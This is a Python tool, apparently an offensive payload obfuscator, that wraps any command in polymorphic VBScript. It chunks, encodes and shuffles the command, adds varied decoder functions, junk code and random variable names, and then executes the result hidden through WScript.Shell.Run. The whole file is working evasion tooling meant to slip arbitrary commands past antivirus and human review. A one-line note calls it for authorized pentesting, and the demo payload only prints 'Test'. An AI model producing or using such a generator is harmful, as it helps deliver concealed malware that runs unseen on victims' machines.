#!/usr/bin/env python3
"""
Array Polymorphic Wrapper with Randomized Chunk Order
Generates highly obfuscated array decoders where chunk order is randomized
and polymorphic processing logic varies per execution path.

Features:
- Random chunk order shuffling
- Polymorphic dispatch (multiple decode implementations)
- Index mapping layer to maintain payload integrity
- Obfuscated variable naming
- Multiple encoding schemes
- Self-modifying-style obfuscation patterns

For authorized pentesting and security research
"""

import binascii
import base64
import string
import random
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum


class PolymorphicStrategy(Enum):
    """Polymorphic processing strategies"""
    LINEAR_DECODE = "linear"              # Standard sequential decode
    ACCUMULATE_DECODE = "accumulate"      # Build result via string concatenation
    MODULO_DECODE = "modulo"              # Use modulo arithmetic for indices
    REVERSE_BUILD = "reverse"             # Build result backwards, reverse at end
    LOOKUP_TABLE = "lookup"               # Use lookup table for character conversion
    BITWISE_DECODE = "bitwise"            # Use bitwise operations where possible
    MULTI_VAR_DECODE = "multivar"         # Use multiple intermediate variables


@dataclass
class PolymorphicConfig:
    """Configuration for polymorphic wrapper"""
    strategy: PolymorphicStrategy = PolymorphicStrategy.LINEAR_DECODE
    chunk_size: int = 16
    randomize_order: bool = True
    use_multiple_strategies: bool = True
    num_strategies: int = 3
    add_junk_code: bool = True
    obfuscate_variable_names: bool = True
    encoding_type: str = "hex"  # 'hex', 'base64', 'mixed'
    add_index_mapping: bool = True
    comment_style: str = "none"  # 'vbs', 'inline', 'none'


class ArrayPolymorphicRandomChunks:
    """Generates polymorphic array decoders with randomized chunk order"""

    def __init__(self):
        self.var_counter = 0
        self.chunk_order = []
        self.index_mapping = {}

    def _gen_var(self, prefix: str = "v") -> str:
        """Generate unique sequential variable name"""
        self.var_counter += 1
        return f"{prefix}_{self.var_counter}"

    def _gen_random_var(self, prefix: str = "v", length: int = 6) -> str:
        """Generate random-looking variable name"""
        chars = string.ascii_uppercase + string.ascii_lowercase
        return prefix + "".join(random.choices(chars, k=length))

    def _gen_obfuscated_name(self) -> str:
        """Generate highly obfuscated variable name"""
        patterns = [
            lambda: chr(random.randint(65, 90)) + str(random.randint(0, 9999)),
            lambda: "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(3, 8))),
            lambda: "_" + "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=random.randint(4, 10))),
        ]
        return random.choice(patterns)()

    def _create_index_mapping(self, num_chunks: int) -> Tuple[List[int], Dict[int, int]]:
        """
        Create randomized chunk order with mapping
        Returns: (shuffled_order, index_mapping)
        """
        original_indices = list(range(num_chunks))
        shuffled_indices = original_indices.copy()
        random.shuffle(shuffled_indices)

        # Create mapping: shuffled position -> original position
        index_mapping = {i: shuffled_indices[i] for i in range(num_chunks)}

        self.chunk_order = shuffled_indices
        self.index_mapping = index_mapping
        return shuffled_indices, index_mapping

    def _encode_chunk(self, chunk: str, encoding: str = "hex") -> Tuple[str, str]:
        """
        Encode chunk with specified encoding
        Returns: (encoded_value, encoding_type)
        """
        if encoding == "hex":
            return binascii.hexlify(chunk.encode()).decode(), "hex"
        elif encoding == "base64":
            return base64.b64encode(chunk.encode()).decode(), "base64"
        elif encoding == "mixed":
            # Randomly choose encoding per chunk
            if random.choice([True, False]):
                return binascii.hexlify(chunk.encode()).decode(), "hex"
            else:
                return base64.b64encode(chunk.encode()).decode(), "base64"
        else:
            return binascii.hexlify(chunk.encode()).decode(), "hex"

    def _generate_decode_function_linear(self, func_name: str, param_name: str) -> str:
        """Generate linear decode function"""
        return f"""Function {func_name}({param_name})
    Dim result, i
    For i = 1 To Len({param_name}) Step 2
        result = result & Chr(CLng("&H" & Mid({param_name}, i, 2)))
    Next
    {func_name} = result
End Function
"""

    def _generate_decode_function_accumulate(self, func_name: str, param_name: str) -> str:
        """Generate accumulating decode function"""
        return f"""Function {func_name}({param_name})
    Dim res, pos
    res = ""
    pos = 1
    Do While pos <= Len({param_name})
        res = res & Chr(CLng("&H" & Mid({param_name}, pos, 2)))
        pos = pos + 2
    Loop
    {func_name} = res
End Function
"""

    def _generate_decode_function_reverse_build(self, func_name: str, param_name: str) -> str:
        """Generate reverse-build decode function"""
        return f"""Function {func_name}({param_name})
    Dim temp, i
    temp = ""
    For i = Len({param_name}) To 1 Step -2
        temp = Chr(CLng("&H" & Mid({param_name}, i-1, 2))) & temp
    Next
    {func_name} = temp
End Function
"""

    def _generate_decode_function_lookup(self, func_name: str, param_name: str) -> str:
        """Generate lookup table decode function"""
        hex_chars = "0123456789ABCDEF"
        return f"""Function {func_name}({param_name})
    Dim result, i, hex1, hex2, val
    For i = 1 To Len({param_name}) Step 2
        hex1 = Mid({param_name}, i, 1)
        hex2 = Mid({param_name}, i + 1, 1)
        val = (InStr("0123456789ABCDEF", UCase(hex1)) - 1) * 16 + (InStr("0123456789ABCDEF", UCase(hex2)) - 1)
        result = result & Chr(val)
    Next
    {func_name} = result
End Function
"""

    def _generate_decode_function_multivar(self, func_name: str, param_name: str) -> str:
        """Generate multi-variable decode function"""
        return f"""Function {func_name}({param_name})
    Dim r1, r2, r3, pos, len_val
    r1 = ""
    r2 = ""
    r3 = ""
    pos = 1
    len_val = Len({param_name})
    Do While pos <= len_val
        r1 = r1 & Chr(CLng("&H" & Mid({param_name}, pos, 2)))
        pos = pos + 2
        If pos <= len_val Then
            r2 = r2 & Chr(CLng("&H" & Mid({param_name}, pos, 2)))
            pos = pos + 2
        End If
        If pos <= len_val Then
            r3 = r3 & Chr(CLng("&H" & Mid({param_name}, pos, 2)))
            pos = pos + 2
        End If
    Loop
    {func_name} = r1 & r2 & r3
End Function
"""

    def generate_decode_function(self, func_name: str, param_name: str,
                                strategy: PolymorphicStrategy) -> str:
        """Generate decode function based on strategy"""
        if strategy == PolymorphicStrategy.LINEAR_DECODE:
            return self._generate_decode_function_linear(func_name, param_name)
        elif strategy == PolymorphicStrategy.ACCUMULATE_DECODE:
            return self._generate_decode_function_accumulate(func_name, param_name)
        elif strategy == PolymorphicStrategy.REVERSE_BUILD:
            return self._generate_decode_function_reverse_build(func_name, param_name)
        elif strategy == PolymorphicStrategy.LOOKUP_TABLE:
            return self._generate_decode_function_lookup(func_name, param_name)
        elif strategy == PolymorphicStrategy.MULTI_VAR_DECODE:
            return self._generate_decode_function_multivar(func_name, param_name)
        else:
            return self._generate_decode_function_linear(func_name, param_name)

    def generate_polymorphic_wrapper(self, payload: str, config: PolymorphicConfig = None) -> str:
        """
        Generate polymorphic array decoder with randomized chunk order

        Args:
            payload: Command/payload to encode
            config: PolymorphicConfig with customization options

        Returns:
            VBS code with polymorphic random-chunk decoder
        """
        if config is None:
            config = PolymorphicConfig()

        # Split payload into chunks
        chunks = [payload[i:i + config.chunk_size]
                  for i in range(0, len(payload), config.chunk_size)]

        # Create randomized order mapping
        shuffled_order, index_map = self._create_index_mapping(len(chunks))

        # Encode chunks
        encoded_chunks = []
        encoding_types = []
        for chunk in chunks:
            encoded, enc_type = self._encode_chunk(chunk, config.encoding_type)
            encoded_chunks.append(encoded)
            encoding_types.append(enc_type)

        # Generate variable names
        arr_var = self._gen_random_var("a") if config.obfuscate_variable_names else self._gen_var("arr")
        out_var = self._gen_random_var("o") if config.obfuscate_variable_names else self._gen_var("out")
        idx_var = self._gen_random_var("i") if config.obfuscate_variable_names else self._gen_var("idx")
        map_var = self._gen_random_var("m") if config.obfuscate_variable_names else self._gen_var("map")
        enc_var = self._gen_random_var("e") if config.obfuscate_variable_names else self._gen_var("enc")
        shell_var = self._gen_random_var("sh") if config.obfuscate_variable_names else self._gen_var("sh")
        temp_var = self._gen_random_var("t") if config.obfuscate_variable_names else self._gen_var("temp")

        # Build VBS code
        code = ""

        # Declare arrays
        code += f"Dim {arr_var}({len(chunks)-1})\n"
        code += f"Dim {map_var}({len(chunks)-1})\n"
        code += f"Dim {enc_var}({len(chunks)-1})\n\n"

        # Populate arrays in original order
        for i, encoded in enumerate(encoded_chunks):
            code += f"{arr_var}({i}) = \"{encoded}\"\n"
            code += f"{enc_var}({i}) = \"{encoding_types[i]}\"\n"

        code += "\n"

        # Populate index mapping
        for shuffled_pos, original_pos in index_map.items():
            code += f"{map_var}({shuffled_pos}) = {original_pos}\n"

        code += "\n"

        # Generate multiple decode function implementations
        if config.use_multiple_strategies:
            strategies = random.choices(
                [s for s in PolymorphicStrategy],
                k=min(config.num_strategies, len(PolymorphicStrategy))
            )
        else:
            strategies = [config.strategy]

        func_names = []
        for strategy in strategies:
            func_name = self._gen_random_var("Decode") if config.obfuscate_variable_names else self._gen_var("Decode")
            code += self.generate_decode_function(func_name, "h", strategy)
            code += "\n"
            func_names.append((func_name, strategy))

        # Generate dispatcher logic
        code += f"Dim {out_var}\n"
        code += f"{out_var} = \"\"\n"
        code += f"Dim {idx_var}\n\n"

        code += f"' Process chunks in randomized order\n"
        code += f"For {idx_var} = 0 To UBound({map_var})\n"
        code += f"    Dim {temp_var}\n"
        code += f"    {temp_var} = {map_var}({idx_var})\n"
        code += f"    Dim chunk_data\n"
        code += f"    chunk_data = {arr_var}({temp_var})\n\n"

        # Polymorphic dispatch
        if len(func_names) > 1:
            code += f"    ' Polymorphic dispatch based on index\n"
            code += f"    Select Case ({idx_var} Mod {len(func_names)})\n"
            for dispatch_idx, (func_name, strategy) in enumerate(func_names):
                code += f"        Case {dispatch_idx}\n"
                code += f"            {out_var} = {out_var} & {func_name}(chunk_data)\n"
            code += f"    End Select\n"
        else:
            code += f"    {out_var} = {out_var} & {func_names[0][0]}(chunk_data)\n"

        code += f"Next\n\n"

        # Add junk code if requested
        if config.add_junk_code:
            junk_var1 = self._gen_random_var("junk")
            junk_var2 = self._gen_random_var("dummy")
            code += f"' Junk code for obfuscation\n"
            code += f"Dim {junk_var1}, {junk_var2}\n"
            code += f"{junk_var1} = {random.randint(1000, 9999)}\n"
            code += f"{junk_var2} = {junk_var1} * {random.randint(10, 100)}\n"
            code += f"If {junk_var2} < 0 Then {junk_var1} = {junk_var2} End If\n\n"

        # Execute payload
        code += f"Dim {shell_var}\n"
        code += f"Set {shell_var} = CreateObject(\"WScript.Shell\")\n"
        code += f"{shell_var}.Run {out_var}, 0, False\n"
        code += f"Set {shell_var} = Nothing\n"

        return code

    def generate_advanced_polymorphic(self, payload: str,
                                     variant_count: int = 3) -> str:
        """
        Generate advanced polymorphic wrapper with multiple random variants

        Args:
            payload: Command/payload to encode
            variant_count: Number of different variants to generate and select from

        Returns:
            VBS code that randomly selects and executes one of multiple variants
        """
        variants = []
        for _ in range(variant_count):
            config = PolymorphicConfig(
                randomize_order=True,
                use_multiple_strategies=True,
                num_strategies=random.randint(2, 4),
                add_junk_code=True,
                obfuscate_variable_names=True
            )
            variant = self.generate_polymorphic_wrapper(payload, config)
            variants.append(variant)

        # Create wrapper that selects random variant
        selector_var = self._gen_random_var("variant")

        code = f"Dim {selector_var}\n"
        code += f"{selector_var} = Int(Rnd() * {len(variants)})\n\n"

        for idx, variant in enumerate(variants):
            code += f"If {selector_var} = {idx} Then\n"
            # Indent the variant code
            indented_variant = "\n".join(["    " + line for line in variant.split("\n")])
            code += indented_variant + "\n"
            code += f"End If\n\n"

        return code


def create_polymorphic_demo() -> Tuple[str, str]:
    """
    Create demo showing polymorphic wrapper generation

    Returns:
        (generated_code, metadata_info)
    """
    generator = ArrayPolymorphicRandomChunks()

    test_payload = "powershell.exe -NoProfile -Command \"Write-Host Test\""

    # Basic polymorphic wrapper
    config = PolymorphicConfig(
        randomize_order=True,
        use_multiple_strategies=True,
        num_strategies=3,
        add_junk_code=True,
        obfuscate_variable_names=True,
        encoding_type="hex"
    )

    generated_code = generator.generate_polymorphic_wrapper(test_payload, config)

    metadata = f"""
POLYMORPHIC WRAPPER METADATA
============================
Payload: {test_payload}
Payload Length: {len(test_payload)}
Chunk Size: {config.chunk_size}
Total Chunks: {len(test_payload) // config.chunk_size + (1 if len(test_payload) % config.chunk_size else 0)}

Configuration:
- Randomized Chunk Order: {config.randomize_order}
- Multiple Strategies: {config.use_multiple_strategies}
- Number of Strategies: {config.num_strategies}
- Add Junk Code: {config.add_junk_code}
- Obfuscate Names: {config.obfuscate_variable_names}
- Encoding Type: {config.encoding_type}

Code Statistics:
- Generated Code Length: {len(generated_code)} bytes
- Lines of Code: {len(generated_code.split(chr(10)))}
- Contains WScript.Shell: {"WScript.Shell" in generated_code}
- Contains Polymorphic Functions: {generated_code.count("Function") > 1}

Chunk Order (Shuffled):
{generator.chunk_order}

Index Mapping:
{generator.index_mapping}
"""

    return generated_code, metadata


if __name__ == "__main__":
    print("\n" + "="*80)
    print("POLYMORPHIC ARRAY DECODER WITH RANDOMIZED CHUNK ORDER")
    print("="*80 + "\n")

    # Generate demo
    code, metadata = create_polymorphic_demo()

    print(metadata)

    print("\nGENERATED VBS CODE SAMPLE:")
    print("-"*80)
    lines = code.split("\n")
    for line in lines[:50]:
        print(line)

    if len(lines) > 50:
        print(f"\n... ({len(lines) - 50} more lines) ...")
        for line in lines[-10:]:
            print(line)

    print("\n" + "="*80)
    print("✓ Polymorphic wrapper generation complete")
    print("="*80 + "\n")
